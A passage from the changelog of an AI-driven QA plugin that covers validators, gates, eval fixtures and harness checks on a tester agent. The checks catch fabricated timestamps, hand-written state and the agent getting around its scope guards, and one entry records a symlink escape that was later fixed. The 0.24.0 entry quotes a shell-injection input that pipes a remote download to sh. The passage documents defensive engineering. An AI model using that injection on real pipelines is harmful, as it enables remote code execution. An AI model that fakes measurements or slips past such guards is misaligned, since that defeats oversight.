  pass — baseline when there is no history, today's delta when there is, a narrowed delta
  when you name a target — **and says which it chose and why** rather than silently
  deciding. Narrowing scope stays legitimate; narrowing the artifact does not, and
  everything outside the narrowed scope lands in `not_tested`.

## 0.29.0 — 2026-08-30 · "the record and the runner"

Two architecture items from the external review, both about closing loops the design
already implied.

- **`runs.jsonl` — history gets a machine-native store.** The run-over-run time series
  lived only in INDEX.md, and consumers parsed the markdown table with heuristic column
  matching. Production defeated that months ago: run-type cells carry prose like "delta
  (merge gate re-gate: … @ 5b9518d1)", and every reader had to un-parse a rendering. One
  JSON line per finalized run now — number, type, verdict, timestamp, SHAs, test counts,
  open-by-severity, delta counts, report. `get_history`/`get_trends` read it first and
  fall back to the INDEX parse only for history predating the file; the INDEX stays, as a
  render for humans. Readers skip a torn trailing line and keep the last line per
  run_number.
- **`verdict-run` — the nightly script, shipped.** Every adopter so far re-invented the
  same runner, and each copy re-learned the same three lessons: a headless session can
  end its turn without writing state (exit 0, a lost night that looks like success); a
  session-limit error names its reset time; a dead run must not re-serve yesterday's
  verdict. `verdict-run` is those lessons — records the run_number the run must beat,
  retries once on each failure mode, gates with `--min-run-number` and `--require-harness`
  armed by default, and exits with the gate's code. Everything after a bare `--` passes to
  the `claude` CLI verbatim.
- **The model that signed the verdict is measured, not remembered.** `verdict-run` exports
  `VERDICT_MODEL`; `verdict-facts` lands it in `last_run.model` and the history row.
  Which model is verdict-trusted used to live in the operator's memory; now a consumer
  reading the state can see which judge signed it.

## 0.28.0 — 2026-08-29 · "the species you are actually facing"

Most code Verdict reviews from here on was written by a model, and models fail with a
signature: the surface is *more* polished than human code while the defects sit
underneath, where polish stops a reader from looking. Built the full way — measured,
catalogued, and evaluated — never as prompt lore.

- **`docs/ai-authored-code.md`** — ten patterns, each a procedure with a trigger, a check
  and an evidence bar, and where possible the real incident that earned it from this
  project's own audited history: declared-but-never-wired (the `STATUSES` enum),
  convergent duplication that drifts (the REGRESSED-first sort), fix-the-instance-miss-
  the-class (AJT-F-14), self-satisfying tests (AJT-F-13, the liar fixture), hallucinated
  surface, silent swallows, placeholder erosion, Chesterton demolition, context-window
  seams, confident-comment-different-code. Plus a reading order under budget: deletions
  first, because absence is the one defect nothing else ever looks at.
- **`code_census` in facts.json** — the mechanically countable signatures, measured by
  `verdict-facts` rather than left for the model to notice: import roots matching no
  declared dependency, no stdlib module and no local module (the hallucinated-dependency
  check, which is also the slopsquatting check); TODO/"for now"/stub markers and swallowed
  exceptions (`except: pass` as adjacent lines, empty `catch {}` in both block and arrow
  form); AI-attribution of the range from commit trailers, with the stated caveat that
  absence of trailers proves nothing. Diff-scoped on delta runs, a capped tree scan on
  baselines, and every census names its own scope. A census is a **lead, never a finding**.
- **§4.5 in the agent prompt** wires it in: provenance is a §8.2 risk-prior input like
  change volume, never a conviction; the five §3 classes stand — these are finding
  sources, not a sixth classification; and the §9 confidence discipline applies unchanged,
  so the calibration table will say whether the catalog sharpens the tester or makes it
  cry wolf.
- **`eval/fixtures/slop/`** — the scored fixture, with real git history: a polished,
  green, plausibly-generated module whose defects are exactly the catalog's species. The
  "simplify" commit deletes the rule-4 guard; the "full coverage" commit deletes the test
  that guarded it; the suite passes and every defect must be found by reading. Two of
  three commits carry AI trailers so the provenance census fires. Eight-row answer key.
- The profile front matter gains `authorship:`, recorded into the census as a declaration
  alongside the measured trailer count.

## 0.27.0 — 2026-08-29 · "checked where the author stands"

`verdict-finalize` validated only the merged state. That is the right place to stop a bad
state reaching disk and the wrong place to *explain* one: the agent's mistake arrived
translated into the vocabulary of a structure it never wrote. A reworded evidence line
surfaced as `repeats id` — true, and useless.

- **`judgment.json` is now checked at its own boundary**, before the merge, and nothing is
  written when it fails. The messages name the finding index, its id, the field and what
  belongs there: a finding not present in the previous state is told it will be filed
  `NEW` and must state its confidence *now* (knowable before the merge, not after); two
  findings under one id are told to mint a second; an open finding without evidence is a
  hypothesis; a `pass` over an open Critical is §10.
- **Fields the harness computes are called out rather than silently overwritten.** A
  judgment that sets `hash`, `first_seen`, `age_days`, `outcome` or `carried_forward` is
  told so — judgment.json carries judgment, and saying which fields are not judgment
  teaches the contract better than a rule nobody reads.

## 0.26.0 — 2026-08-29 · "the profile runs the gates"

The last transcription step in the pipeline is gone.

`profile.md` has always recorded a project's real commands, and the agent has always had to
*retype* them into `verdict-facts --gate suite='…'` on every run. That is a model sitting
between the configuration and the measurement, which is the exact arrangement the rest of
this architecture exists to delete — and it was already failing in production: the sales
profile grew a "Real commands" section precisely because the retyping kept going wrong.

- **A front-matter block at the top of `profile.md`** names the gates, the test-id command
  and the coverage command. `verdict-facts` reads it, so the canonical invocation is now
  `verdict-facts --repo . --qa-root <root>` with no flags at all. Explicit `--gate` still
  wins for narrowing a run, and the override is recorded in the facts.
- **A deliberately small subset of YAML, not YAML.** `key: value` at the left margin, one
  level of two-space-indented `name: value` under a bare `key:`. Values run to end of line
  and are taken literally, because commands are full of colons, quotes and pipes and a
  cleverer parser would mangle them. Stdlib only — the harness still runs bare.
- **A line it cannot read is an error naming that line**, never a skip. Silently dropping a
  gate would reintroduce the failure the block exists to remove, and a run that measured
  nothing looks exactly like a run with nothing to measure. For the same reason, keys the
  harness does not read are reported rather than discarded, and a run that ends up with no
  gates at all records `no_gates` and says every count and duration gate is unmeasurable.
- `/qa-baseline` writes the block first, and is told to omit a key rather than guess at it:
  a wrong command measures the wrong thing silently, a missing one is reported.

## 0.25.0 — 2026-08-29 · "one spelling of everything"

A refactor review of the whole tree. Most of it said *leave this alone*, correctly. What it
found that mattered was duplication — and in two places the duplicates had already drifted.

- **The report and the gate disagreed about finding order.** `harness` carried its own copy
  of the REGRESSED-first sort, and the copies were not identical: `order_findings` strips
  whitespace before ranking a severity and the harness copy did not, so a severity written
  ` Critical ` sorted below `Major` in the report and above it in the gate, the MCP surface
  and the PR comment. One function now.
- **The outcome ledger was folded twice, from two different dates** — `merge` used the run
  date, `write_state` re-derived it from the run timestamp — so across a UTC-midnight run
  the calibration block inside the state could disagree with the ledger persisted beside
  it. Folded once and carried, and the private key it travels on is taken off before
  anything serialises the state.
- **Every state write is now atomic** — temp file plus `os.replace`, for `state.json`, its
  `.prev` snapshot, `outcomes.json` and the INDEX row. A crash mid-write left the file the
  whole system pivots on half-written; §6 already carried a rule for recovering from a
  corrupt state, and it is cheaper to make that near-impossible than to handle it well.
- **`__version__` said 0.2.0** while `plugin.json` and `pyproject.toml` said 0.24.0 — a
  third place to remember at release time is a third place to forget. It reads the
  installed distribution now.
- One spelling of the `VERDICT_HOME` default in importable code; the hooks keep their own
  copy on purpose, because a PostToolUse hook that can raise `ImportError` is worse than a
  duplicated line.
- **Lint config committed and wired into CI** — pyflakes, syntax errors, complexity and
  ambiguous names. Deliberately not `ruff format`: the narrative comment layout is a house
  idiom and reformatting it would churn every file for nothing. Cleared what it found:
  seven unused imports, five ambiguous `l` variables.
- Docs: `git_sha_previous` and `gates.<name>.blocking` appeared in the schema example and
  have never been written by the harness.

## 0.24.0 — 2026-08-29 · "not just Python, measurably"

Remaining items from the external audit, in value order.

- **Runner dialects.** The count parser only ever spoke pytest, so for Go, Ruby, PHP, .NET
  and JVM projects the counts came back empty — and *silently*, which meant two of the
  things Verdict does that a plain test run does not (the "a silent drop in test count is a
  finding" gate, and the test-id set-diff) simply never fired there. Now twelve dialects,
  each selected by a signature phrase rather than by ordering, because the vocabularies
  overlap: `1 failure` is both gotestsum and rspec, `Failures: 1` is both surefire and
  phpunit, `5 passed` is pytest, cargo, jest and vitest. Read by the wrong dialect the
  numbers are not so much wrong as incomplete — cargo read as pytest silently drops
  `ignored`, which is the skip count the gate cares about. Plain `go test` prints no totals
  at all and is tallied from its `--- PASS:` lines.
- **Unparsed is now said out loud.** A gate whose summary matched nothing records
  `counts_unparsed` instead of quietly omitting counts: "the suite reported nothing" and
  "we failed to understand the suite" are different problems with different fixes. Where a
  runner reports its own total, that total wins over our arithmetic over its parts — they
  disagree when a test errors during collection.
- **`action.yml` no longer splices inputs into shell.** `run-prompt`, `project`, `fail-on`,
  `findings`, `max-age-hours`, `min-run-number` and `claude-version` now arrive through
  `env:`. Quoting a `${{ }}` interpolation does not help: the substitution happens before
  bash parses the line, so an input like `"; curl evil | sh; #` executes. Inputs are
  workflow-author controlled, but one person wiring `run-prompt` to a PR title turns that
  into remote code execution.
- **The README pinned `@v0.6.0`** — fourteen versions stale, so anyone copying the snippet
  got an ancient gate. Floating `@v0` now.
- **The scorer no longer calls a team-mode run a modified fixture.** `.qa/` joins the
  byproduct list: in team mode the QA root lives inside the tree, so a run that wrote its
  own state looked like a run that edited the code under test.
- Both READMEs claimed three fixtures and listed six.

## 0.23.0 — 2026-08-29 · "the enum that was never checked"

An external audit found the worst bug this project has shipped, and it was three days old:
`STATUSES` was declared in two modules and enforced in neither. `is_open()` recognised only
the exact string `"open"`, so a single mistyped word made a finding invisible to the release
blockers, the gate, the hotspot ranking, and the rule that a `pass` cannot stand over an
open Critical. Reproduced end to end through the shipped tools: a `pass` state carrying an
open Critical `REAL_DEFECT` typed `"closed"` validated cleanly and gated **exit 0** — the
false-green merge this product exists to prevent. Verdict's own committed `.qa/state.json`
carried such a finding.

Closed at three levels, because one was clearly not enough:

- **The contract.** `verdict-validate` now requires `status` and rejects anything outside
  `open` · `resolved` · `withdrawn`. No state carrying one can be written through the
  harness, and the PostToolUse hook flags it in-session.
- **The reading.** `is_open()` is now *open unless explicitly closed*. An unrecognised or
  missing status is not evidence that a defect was fixed — it is evidence that nobody
  knows — so it counts against the verdict rather than vanishing from it.
- **The gate.** `verdict-gate` refuses a state whose recorded verdict contradicts its own
  recorded findings: an open Blocker admits no verdict but `fail`, and an open Critical
  caps at `pass with risks` (§10). The gate does not re-adjudicate; it declines to launder
  a contradiction. Four of the gate's own test fixtures turned out to encode exactly that
  contradiction as their baseline.
- The duplicated `STATUSES` constant is gone — the copy that had no reader was the one
  that made the other easy to forget.

Also from the audit, and still open: the committed `.qa/` is a v0.12-era snapshot and needs
a real re-baseline; a state at rest can never satisfy the run-freshness rule, so validating
a committed state in CI needs a mode that separates well-formedness from recency.

## 0.22.0 — 2026-08-29 · "measured, or say so"

The harness is proven, so it stops being optional.

- **§6 no longer offers an opt-out.** "When `verdict-facts` is available" invited the model
  to decide it was not; the tools are stdlib Python that run from any checkout with nothing
  installed, so unavailability is almost never true. A run that genuinely cannot use them
  must say so in the report — the command, its error, and the fact that every measured
  value below was produced by hand. Silently writing the state directly is out.
- **`verdict-gate --require-harness`, exit 6.** Distinct from `4` (never ran) and `5` (ran
  too long ago): the tester ran and wrote a state, but composed the numbers instead of
  measuring them. Checks four traces only the pipeline leaves — facts measured *for this
  run* (a stale `facts.json` inherited from an earlier one does not count), a judgment
  file, a computed state, a rendered report.
- **One definition of those traces**, in `state.py`, shared by the gate, the eval scorer
  and the MCP surface. Duplication is what let both the eval runner and the nightly script
  keep hand-written hook lists that silently missed the PostToolUse validator when it
  shipped — neither ever ran production's guard set.

## 0.21.0 — 2026-08-29 · "the path nothing had ever run"

The measure → judge → finalize architecture shipped across 0.18–0.20 and had never once
executed. No live QA root held a `facts.json`; the harness reached the installed plugin
hours after the last production run; and eval runs scored the state without ever asking
how it was written. Driving it by hand against the seeded fixture found three defects, each
fatal to the path, and a live model run then completed it end to end — 6/6, with every
harness signal present.

- **Identity survives rewording.** `merge` matched previous findings by hash alone. A hash
  is a fingerprint of the words and moves the moment the tester rewords its own finding, so
  a reworded re-report was filed as `NEW` *and* carried forward as resolved — two entries,
  one id, and a state the validator rightly refuses, meaning the run produced nothing at
  all. It now falls back to the `id`, which §6 mints once and forbids reusing. This is also
  what makes migration possible: all 115 finding hashes across the four live projects were
  authored by hand before the harness existed and match nothing computable, so no project
  could have taken its first harness-driven run.
- **The run marker no longer cries wolf, twice over.** `verdict-facts` wrote it and then
  read it back on the same pass, so every healthy run announced that the previous one had
  been abandoned. And a legitimate retry — a mistyped gate command, re-run at the same
  commit — was reported as a lost night; the marker now records its commit, and a recent
  attempt at the same one is reported as this run's own retry. A marker at a different
  commit, or an old one, is still the real alarm.
- **The seeded fixture could not pass through the harness.** Golden's seven hashes were
  decorative values no computation produces. Recomputed from content, and the fixture now
  ships the test-id ledger its own fiction implies, so its delta reports a clean set-diff
  instead of eight invented additions.

Eval fidelity, both directions:

- `provision()` restated the hook list by hand and had drifted: every eval run since the
  validator shipped exercised a different guard set than production, and the PostToolUse
  state check never fired once. It now reads `hooks/hooks.json`.
- `score.py --require-harness` hard-fails a run that hand-wrote its state, on four
  independent traces: facts measured, judgment written, state computed, report rendered.
  Off by default so the pre-harness corpus keeps scoring; on for entries that record it.
- The passing run is archived as the corpus's first pipeline-produced entry.

## 0.20.1 — 2026-08-29

- **Two findings may no longer share one hash.** Found in a live state the moment the
  outcome ledger started keying on identity: one defect filed twice under two ids, the
  second titled "F-003 confirmed in production". By the identity rule those are the same
  finding, so ageing, deltas, and now the ledger all collapsed them — silently, onto
  whichever was written last. The validator forbade duplicate `id`s and never checked the
  field identity actually runs on.

## 0.20.0 — 2026-08-29 · "the tester's own error rate"

A QA agent's findings are worth what its track record says they are worth, and until now
Verdict had no track record — only findings that quietly stopped being mentioned. This
release makes the tester's accuracy a measured, auditable number that the tester itself
cannot touch.

- **Confidence, stated at filing and frozen there.** Every finding filed this run carries
  `confidence` — `proven` (demonstrated it happen), `probable` (traced, not executed), or
  `hypothesis` (suspected). The validator refuses a `NEW` finding without one, because a
  confidence supplied after the outcome is known is hindsight in a prediction's clothes;
  the harness restores the filed value if a later run tries to revise it.
- **The outcome is computed, never claimed.** `outcome` is derived from what a finding
  *did*: it regressed, or its fix was verified by re-injection (`fix_verified: true`, which
  now has to cite the guard that failed) — it held up; the tester withdrew it — it did not.
  Anything else stays `unknown` and is excluded from every rate rather than guessed at,
  because a resolution nobody verified is an absence, not proof. A decided outcome sticks,
  so the record cannot erode as findings change state; only a withdrawal overrides it.
- **`outcomes.json`, the permanent ledger.** `state.json` drops findings resolved two runs
  ago, which meant decided outcomes left the sample as soon as they stopped being news.
  One compact upserted row per finding ever filed now outlives the findings list — the
  reason a rate can ever accumulate at all.
- **Track record in the report, and rates only when earned.** `verdict-finalize` renders a
  section reading "N tracked · M settled" with per-confidence and per-proof-method counts;
  a percentage appears only once a bucket has 30 settled outcomes. Below that the counts
  stand alone, because "2 of 3" is a fact and "67%" is decoration. Exposed over MCP through
  `get_trends`.
- **A withdrawn finding no longer vanishes.** It was dropped from state on the next run
  that failed to mention it — the tester's own false-positive record aging quietly off the
  page. It is now carried forward and stays visible.
- **Two live bugs in the status field these tallies read.** A production baseline wrote
  `"OPEN"`, and every `status == "open"` comparison in the codebase disagreed with it: the
  gate reported zero open findings for a project holding seven, one of them Critical, and
  the scorer's pass-over-an-open-defect hard fail could not trip. Comparisons are now
  case-insensitive in one place; the harness normalizes on write. Separately, a withdrawn
  finding that went unmentioned was silently converted into a resolved one.

## 0.19.0 — 2026-08-29 · "the report is the state"

- **The report is rendered, not typed.** `verdict-finalize` builds it from `state.json` —
  scope and SHA range, the gates table, tests and the id-ledger delta, findings ordered
  REGRESSED-first with evidence and root-cause chains, blockers, not-tested, quarantine —
  and injects the agent's `prose` sections (scope, risks, fix order, per-finding
  narrative). Two failure modes stop being possible rather than forbidden: the artifact
  cannot go missing, because the harness writes it, and it cannot disagree with the state,
  because it *is* the state. It names the file from a `topic` when the agent supplies none.
- **Checkpoints, honestly scoped.** Resumable runs are not a real thing here — a model's
  judgment cannot be continued from the middle, and a partly-judged run is not a run. What
  is real: `verdict-facts --reuse-if-fresh` skips re-running the gates when the existing
  facts describe the same HEAD and are recent (the nightly's one retry no longer pays for
  the suite twice), recording that the measurement was reused and how old it is; and a run
  marker makes an abandoned run **visible** — the next run reports
  `previous_run_incomplete` as a fact instead of pretending the night never happened.

## 0.18.0 — 2026-08-29 · "the model judges; the system measures"

The second half of the architecture the validator opened. If two thirds of a state file is
arithmetic and transcription, the fix is not to ask the model to be careful — it is to stop
asking the model.

- **`verdict-facts`** (read-only on the repo): measures the timestamp, project key, git
  SHA, branch, `sha_range` and diff stat, `run_number`, and `run_type` — including the §6
  re-baseline triggers (stored SHA absent from the repo, previous run older than a week,
  diff beyond 100 files / 10k lines), each with its reason. Runs the gates the caller
  names, times them, records exit codes, extracts the summary line and counts, and keeps
  the test-id ledger by set-diff.
- **`verdict-finalize`**: merges facts with the agent's `judgment.json`, computing every
  finding's hash, `first_seen`, `age_days`, and delta from the previous state — the
  arithmetic the model used to do by hand and sometimes got wrong. A finding the previous
  run had and this run did not mention is carried forward as RESOLVED rather than silently
  dropped. It validates before writing and refuses invalid states outright: the PostToolUse
  hook matches Write/Edit and would never see a file a shell command wrote.
- Three defects found by running it against a real repository before shipping, each now a
  regression test: zero collected test ids was reported as `count: 0` (an empty suite is
  not the same as a broken command — and the commonest cause is the project's own `-q`
  turning `--collect-only -q` into `-qq`, this tool's own liar-fixture trap); the ledger was
  read with whitespace splitting, so parametrised ids containing spaces came back as
  several ids and would have read as churn on the next run; and the bare-script entry
  dispatched on its own filename.

## 0.17.0 — 2026-08-29 · "the contract is a gate, not a request"

An architectural release rather than a prompt one. The diagnosis: roughly **20 kinds of
state field are deterministic** (timestamps, SHAs, counts, durations, ages, deltas,
hashes, the project key) against **11 that are genuine judgment** — so two thirds of what
the model writes into state is transcription and arithmetic, and every one of those is a
place to be confidently wrong. Proof that prose cannot fix it: months after `date -u`
became an explicit rule, **two of four production timestamps still sat on exactly `:00`
seconds**.

- **`verdict-validate`** (stdlib, runnable as a bare script; console script
  `verdict-validate`; **PostToolUse hook** on every `state.json` write): the state contract
  as a machine gate. Report must name an existing `.md` file · timestamps ISO-Z and near
  now · `run_number` must advance (with `state.json.prev` making that checkable) · enums
  are enums · open findings need evidence · `pass` cannot stand over an open
  Critical/Blocker · quarantine entries need expiries. Violations surface **in-session**,
  where they cost a correction instead of a run.
- Its first run against four live states found violations in two — including the exact
  report dodge a prompt rule had failed to prevent three times, and a fabricated timestamp.
- **Two schema gaps it exposed, fixed rather than punished** — the agent had invented
  values because the contract lacked the concepts: `run_label` now carries descriptive run
  text (it was being smuggled into `run_type`, breaking every consumer that switched on
  it), and **`WITHDRAWN`** joins the delta enum as the tester's own false-positive record.
  A tester that quietly deletes its wrong findings hides its error rate — the one number a
  reader needs to weigh everything else it says.

## 0.16.0 — 2026-08-29 · "the vital few, measured"

Risk-based prioritisation was already in the contract (§8.2) and defect clustering was
already a principle (§8.4) — but both were *unmeasured*: the agent was told to mine
"incident history in the profile", prose written once, while the actual defect
distribution sat unread in its own state file. Live proof at the time of writing: the
Sales state held 52 findings whose ranking nobody had ever computed.

- **`hotspots()`** (`verdict_mcp.state`, surfaced through `get_trends`): defect clusters
  computed from the project's own findings — per file, **severity-weighted** (ten typos
  are not a Critical; weighting demonstrably reorders the top four on real data), with
  all-time and still-open counts side by side. Paths cited at different depths across runs
  are merged onto one entry: unmerged, the live Sales data split one hot module into two
  lukewarm ones and the ranking lied. `runs_of_history` ships with the answer, because a
  ranking over one run is a snapshot, not a pattern.
- **§8.4 now says compute, not recall**, with the merge rule and the weighting rule
  spelled out; the profile's incident history complements the computation instead of
  standing in for it.
- **§8.2 makes the budget auditable**: report the ranked surface with its numbers, the
  cutoff line *and why it fell there*, and everything below it — which goes to
  `not_tested` without exception. A ranking nobody can see is an opinion. §12 gains the
  `Risk ranking & cutoff` section, one line long when the surface is small enough to cover
  completely: ceremony over eight tests is waste.

Deliberately not built: a scored "prioritisation" fixture. On a fixture small enough to
audit, an agent covers everything anyway, so the ranking is unobservable — and adding a
required report section to the existing answer keys would retroactively fail the archived
runs in the scorer corpus. The computation is unit-tested instead, including both defects
this design had before the data was checked.

## 0.15.0 — 2026-08-29 · "the chain, not the label"

Classification says what a failure *means* (§3); root cause says why it exists and where
the fix belongs — and it is the easiest place in the whole contract to be confidently
wrong, because a plausible causal story reads as true and nobody checks it.

- **§3.5 Root Cause**: report a four-link chain — symptom → mechanism → origin → **class**
  — with a citation on every link, never a label. The class link is mandatory: a fix aimed
  at the reported instances leaves the pattern alive. Causation is *proven*, in order of
  strength: counterfactual (flip the cause in a scratch copy, watch the symptom flip),
  differential, archaeology (`git log -S`/`-L`, blame, bisect), reading. Trigger, cause,
  and latent condition are named separately — they have different owners. Depth is bounded
  by evidence: the first unevidenced answer ends the chain as `HYPOTHESIS:`.
- **`/qa-cause`** drives it, and stops at diagnosis: naming *where* the fix belongs (code,
  test, spec, environment, process) is owed; writing it is not.
- **`findings[].root_cause`** in the state schema, so the next run inherits the diagnosis
  instead of re-deriving it.
- **Root-cause eval fixture** ([fixtures/rates](eval/fixtures/rates)) — the first with real
  git history, replayed commit by commit so archaeology is possible: the symptom is three
  modules from the cause, the commit that exposed it is a test-data change, the
  suspicious-looking recent cache is innocent, and two more sites carry the same defect
  untested. **6/6 on the first run**, decoy resisted. The scorer gains a `report_forbids`
  row type — some points are earned by what a run refuses to claim.

## 0.14.0 — 2026-08-28 · "the measured suite"

The pesticide-paradox rule (§11) applied to ourselves: mutation testing over the guards,
scorer, gate, state, and server — 1275 mutants, kill rate **61.9% measured, 66.4% after
one hardening pass**, published per-file in [eval/README.md](eval/README.md).

- **+44 killer tests (110 → 154)**: the Bash guard's deny matrix now enumerates every
  mutator command and git verb it claims to block (57% → **77%** — each surviving
  constant was a command whose denial nothing checked); `evaluate()`'s exit-code contract
  gets exact-boundary coverage (`--min-run-number` equality passes, unparseable
  timestamps are stale, unknown verdicts exit 4, stale outranks blocked) and the JSON
  contract fields are asserted.
- Baseline profiles now record the project's **mutation-testing command** alongside
  coverage when a tool is already present (§6 stub, `/qa-baseline`) — never installed.
- Honest residue, stated: formatter message-text mutants dominate the gate's remaining
  survivors and are low-value; score.py/server.py/state.py are the next hardening targets.

## 0.13.0 — 2026-08-28 · "trajectory and annotations"

- **MCP `get_trends`**: run-over-run trajectory parsed from the INDEX (dates, verdicts,
  test counts) plus the current pressure picture — open findings by severity, age
  distribution (oldest/median), quarantine size, suite duration. Direction is the signal.
- **`verdict-gate --format sarif`**: open findings as SARIF 2.1.0 — severity mapped to
  level, locations parsed from `file:line` evidence — ready for
  `github/codeql-action/upload-sarif`, so findings land as annotations in the Security
  tab. Exit-code contract unchanged by format.

## 0.12.1 — 2026-08-28 · security: symlink escape in the scope guards

Found by Verdict itself, in the first run of the self-gating baseline
(VERDICT-F-1, Major/P1): both scope guards resolved paths with `abspath`, so a
symlink planted inside a `.qa/` directory laundered writes to wherever it
pointed. The shared predicate now uses `realpath`; a write through a
`.qa`-resident symlink to the outside is denied by both the Write/Edit guard
and the strict-mode Bash guard, with escape tests for each. Also
VERDICT-F-3: CI's extra `-q` on top of pyproject's `addopts = "-q"` made
`-qq` — the exact countable-summary trap our own liar fixture seeds — removed.

The repository now gates its own pull requests (keyless Action gate mode over
committed team-mode `.qa/` state); these findings came from that run.

## 0.12.0 — 2026-08-28 · "reward, done honestly"

Reinforcement without self-deception: the score selects configurations, memory carries the
lessons, and the judged agent never sees its own ledger.

- **Lessons ledger** (`<qa-root>/lessons.md`, §6/§7): when a run overturns a prior
  judgment — a RESOLVED that was never fixed, a FLAKY with an identifiable mechanism — it
  files a three-line dated correction, read at the start of every future run. The only
  learning a frozen model gets at runtime, spent on corrections, not chronicle.
  `get_profile` serves the ledger to MCP consumers.
- **Quarantine expiry is an action, not an opinion** (§6): release the entry and record
  why, or re-quarantine with fresh evidence and a new expiry — "recommend lifting" while
  leaving it in place is a dodge. Added after a real variance-series miss.
- **Variance measured and published**: `--repeat N`; first series (Sonnet ×3 on both
  nightly protocols) adjudicated miss by miss — baseline stable, delta 2-of-3, and the
  nightly **reverted to Opus** on that evidence. Model probation ledger documented in
  [docs/nightly.md](docs/nightly.md): 2 non-ok in trailing 5 demotes to the fallback;
  a verdict of `fail` is never non-ok — punishing bad news teaches a tester to stop
  delivering it.
- **Scorer amendments #3 and #4** (published): tool byproducts are not fixture
  modifications; multi-line finding entries no longer trip the REGRESSED-first anchor.
  Both rehabilitated runs re-scored from preserved workdirs at zero token cost.
- **Scorer regression corpus** (`eval/corpus/`, 5 entries incl. Sonnet phrasings) wired
  into CI: every once-passing run must keep scoring full marks forever.

## 0.11.0 — 2026-08-28 · "not just Python"

- **TypeScript/vitest eval fixture** ([fixtures/pricer-ts](eval/fixtures/pricer-ts)) with
  its own machine key: the same five failure classifications in a different language,
  runner, and idiom — and a **JS-native** rounding defect, because `Math.round(x*100)/100`
  is already half-up; the seeded bug is float representation
  (`1.005 * 100 === 100.49999999999999`). A run that transplants the Python explanation
  has not read the code. **8/8 on the first run**, published.
- **Demo asset rebuilt as SVG** ([docs/demo.svg](docs/demo.svg)): the old GIF showed
  pre-0.6 output — no gate, no `/qa-delta`, no set-diff accounting. The replacement is
  hand-authored, dependency-free, crisp at any zoom, and accurate to what the tool prints
  today, including the gate's exit-code legend. The stale GIF is removed.
- **Issue templates** built from Verdict's own standards: a bug report that demands
  expected/actual separately with cited evidence, and an **eval-result template** for
  independent runs — misses explicitly as welcome as passes.

## 0.10.1 — 2026-08-28 · eval key correction

- **All six eval protocols are now scored.** The `live` two-phase round-trip — the agent
  reading its *own* phase-1 state rather than an authored history — scored **8/8 + 4/4**.
- **Answer-key fix, published as an amendment:** the brittle exact-message row matched
  only a test-function name, so a run that reported the finding correctly still scored it
  red. The matcher now matches the concept. Second scorer false alarm in this suite; both
  times the agent was right, and `eval/README.md` now carries the standing rule — *when a
  row misses, suspect the scorer first*.

## 0.10.0 — 2026-08-28 · "reproducible to the last row"

Tool-inventory findings, fixed:

- **Every published eval row now reproduces with one command**: `run_eval.py` gains a
  fixture registry — `--fixture pricer|liar|spec` (the liar and spec rows previously came
  from a hand-built harness that did not ship). The spec fixture runs through the shipped
  `/qa-spec` command file itself.
- **Every eval run is now also a hooks regression test**: the harness provisions both
  scope guards and sets `VERDICT_STRICT=1` for all fixtures.
- **`/qa-charter`**: the exploratory-charter template finally gets its driver — timeboxed
  mission seeded from the profile's risk clusters, §0 governing every probe, discoveries
  converted to bug reports, regression candidates, and `next_run_focus`.

## 0.9.0 — 2026-08-28 · "the ancestor's tricks"

Two battle-earned practices absorbed from the private predecessor's 24-run production
history — the habits it learned that the public prompt never had:

- **RESOLVED requires evidence, not absence** (§6): where a guarding test exists and
  re-injection is cheap, a claimed fix is verified by re-injecting the defect in a scratch
  copy of the tree (never the checkout) and watching that test fail. Every RESOLVED
  finding is reported as *fix-verified* or *merely absent* — they are not the same claim.
- **Test-count accounting by ID set-diff, never summary arithmetic** (§6, §7): sorted
  collected test IDs land in `<qa-root>/test-ids.txt` each run and are diffed before
  overwriting. Summary counts can lie — an output-suppressing flag, a skip-all conftest;
  the ID set cannot.
- §5's red-evidence reproduction now says *scratch copy*, never `git stash` — consistent
  with the strict-mode Bash guard, which blocks stash anyway.

## 0.8.0 — 2026-08-28 · "shift left"

The cheapest defect is the one caught before code exists — now a first-class command with
its own scored eval.

- **`/qa-spec`**: judge a spec, issue, or PRD for testability — requirement inventory
  (a sentence that cannot fail a test is not a requirement), contradictions with both
  lines quoted, unmeasurables, undefined boundaries (exactly-at-the-limit, inclusive vs
  exclusive, calendar vs business days), silent failure-path gaps, conflicts with
  recorded history (CHANGELOG/ADR), and core requirements rewritten as Given/When/Then
  precise enough that the criterion is the test. Spec findings are real findings: they
  land in `state.json` and age/resolve/regress as the spec is revised.
- **Spec eval fixture** ([fixtures/refund-spec](eval/fixtures/refund-spec)) with machine
  answer key ([expected-spec.json](eval/expected-spec.json)): five seeded requirements
  defects plus a criteria-delivery check and a verdict row.
- Scorer: new `report_contains` row type (used to verify the Given/When/Then criteria
  actually shipped in the report).

## 0.7.0 — 2026-08-27 · "trusted on Pro"

Prompt-hardening release: Sonnet — what Claude Pro runs — now scores **8/8** on the
baseline eval (previously 0: it skipped the report artifact and missed the brittle
green-test row). Published in [eval/README.md](eval/README.md).

- **§13 pre-handoff self-check, run as commands, never from memory**: `ls` the report
  file, re-read `state.json` (run_number advanced, verdict matches), confirm the INDEX
  row. An artifact not on disk does not exist; no caller instruction waives the check.
- **§3 green-test sweep**: a passing test that asserts a mock's own return value, a
  tautology, or an incidental detail is a `BRITTLE_TEST` finding — a suite can be green
  precisely because it tests nothing.
- Eval harness: a crashed phase keeps its workdir (the first version deleted the phase log
  it needed to explain the crash).

## 0.6.0 — 2026-08-27 · "sharper blade"

- **`/qa-delta`** — the daily driver as a first-class command: refuses to run without a
  baseline, scopes strictly by the stored SHA range, addresses every `next_run_focus`
  item, re-evaluates expired quarantines, gates on deltas.
- **`/qa-flake`** — the classification one-shot: ≥3 reproductions, mechanism hunt first —
  a diagnosed mechanism is a `BRITTLE_TEST` fix task; only undiagnosed intermittence earns
  a `FLAKY` quarantine, always with an expiry.
- **`/qa-status`** — read-only memory summary; no run, no writes, no agent spin-up.
- **Changed-files coverage is measured, not vibed**: the profile records the project's
  changed-files coverage command (e.g. `diff-cover`) at baseline; §6's direction gate
  cites it or declares itself unmeasurable.
- **Opt-in security-adjacent pass** (`Security-Pass: enabled` in the profile): dependency
  audit with tools already present, plus a diff-only secret scan that reports location and
  shape — never the value. Report-only; penetration testing stays explicitly out of scope.
- **BYO-Playwright worked example** in the README — browser tools under the §0 gate,
  exploratory charters translated to the browser.
- **Concurrency decision documented**: last-writer-wins with `run_number` collision
  detection; deliberately no lock file (a stale lock would block every future run —
  detection beats prevention).

## 0.5.0 — 2026-08-27 · "close the loop"

The tester's memory becomes a machine surface CI can trust.

- **`verdict-gate` CLI**: an exit-code release gate over the state — `0` pass · `1` fail ·
  `2` usage · `3` blocked · `4` no state (the tester never ran) · `5` stale
